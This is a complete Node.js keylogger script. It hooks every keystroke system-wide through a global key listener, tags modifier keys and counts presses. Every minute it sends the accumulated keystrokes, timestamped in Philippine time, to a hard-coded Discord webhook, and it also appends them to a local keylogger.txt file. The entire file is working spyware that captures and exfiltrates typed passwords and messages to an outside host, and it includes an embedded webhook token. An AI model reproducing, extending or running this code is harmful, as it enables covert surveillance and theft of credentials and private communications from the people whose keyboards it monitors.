const GlobalKeyboardListener =
  require("node-global-key-listener").GlobalKeyboardListener;
const axios = require("axios");

const v = new GlobalKeyboardListener();

var l_shift_dn = false;
var l_alt_dn = false;
var r_shift_dn = false;
var r_alt_dn = false;
var keylogs = "";
var keyPressCount = 0; // Initialize key press count

const fs = require("fs");
const logFilePath = "./keylogger.txt";

// Function to append keylogs and key press count to a local file
function appendKeylogsToFile(keylogs) {
  const logEntry = `${keylogs} Total key presses: ${keyPressCount}\n`;
  fs.appendFile(logFilePath, logEntry, (err) => {
    if (err) throw err;
  });
}

// Function to get Philippine standard time (PST) timestamp
function getPHLTimestamp() {
  const date = new Date();
  const pstOffset = 8 * 60 * 60 * 1000; // Philippine time offset in milliseconds
  const pstTime = new Date(date.getTime() + pstOffset);
  const formattedPST = pstTime.toLocaleString("en-PH", {
    timeZone: "Asia/Manila",
    hour12: true,
  });
  return formattedPST;
}

// Log every key that's pressed.
v.addListener(function (e, down) {
  if (e.state == "UP") {
    switch (e.name) {
      case "TAB":
        process.stdout.write(" <TAB> ");
        keylogs += " <TAB> ";
        break;
      case "RETURN":
        process.stdout.write(" <ENTER> ");
        keylogs += " <ENTER> ";
        break;
      case "SPACE":
        process.stdout.write(" ");
        keylogs += " ";
        break;
      case "ESCAPE":
        process.stdout.write(" <ESC> ");
        keylogs += " <ESC> ";
        break;
      case "DELETE":
        process.stdout.write(" <DEL> ");
        keylogs += " <DEL> ";
        break;
      case "BACKSPACE":
        process.stdout.write(" <B.SPACE> ");
        keylogs += " <B.SPACE> ";
        break;
      case "LEFT SHIFT":
        process.stdout.write(" </L.SHIFT> ");
        keylogs += " </L.SHIFT> ";
        l_shift_dn = false;
        break;
      case "LEFT ALT":
        process.stdout.write(" </L.ALT> ");
        keylogs += " </L.ALT> ";
        break;
      case "RIGHT SHIFT":
        process.stdout.write(" </R.SHIFT> ");
        keylogs += " </R.SHIFT> ";
        break;
      case "RIGHT ALT":
        process.stdout.write(" </R.ALT> ");
        keylogs += " </R.ALT> ";
        break;
      default:
        process.stdout.write(e.name);
        keylogs += e.name;
    }
  }
  if (e.state == "DOWN") {
    keyPressCount++;
    switch (e.name) {
      case "LEFT SHIFT":
        if (l_shift_dn == false) {
          l_shift_dn = true;
          process.stdout.write(" <L.SHIFT> ");
          keylogs += " <L.SHIFT> ";
        }
        break;
      case "LEFT ALT":
        process.stdout.write(" <L.ALT> ");
        keylogs += " <L.ALT> ";
        break;
      case "RIGHT SHIFT":
        process.stdout.write(" <R.SHIFT> ");
        keylogs += " <R.SHIFT> ";
        break;
      case "RIGHT ALT":
        process.stdout.write(" <R.ALT> ");
        keylogs += " <R.ALT> ";
        break;
    }
  }
});

setInterval(async () => {
  const logs = `${getPHLTimestamp()} - ${keylogs} Total key presses: ${keyPressCount}`;
  await axios
    .post(
      "https://discord.com/api/webhooks/1237581734082510848/95PsaI6bm6iFBKxyEAA-Q9xRzya9_QKbL_xlp9vM2tYZ5gkO_H90UtaJ--Q4AbeK15FN",
      {
        content: logs,
      }
    )
    .then(async () => {
      appendKeylogsToFile(`${getPHLTimestamp()} - ${keylogs}`); // Append keylogs to the local file
      keylogs = "";
    });
}, 1000 * 60);

 // Ensure the log file is created if it doesn't exist
fs.open(logFilePath, "a", (err, fd) => {
  if (err) throw err;
  fs.close(fd, (err) => {
    if (err) throw err;
  });
});
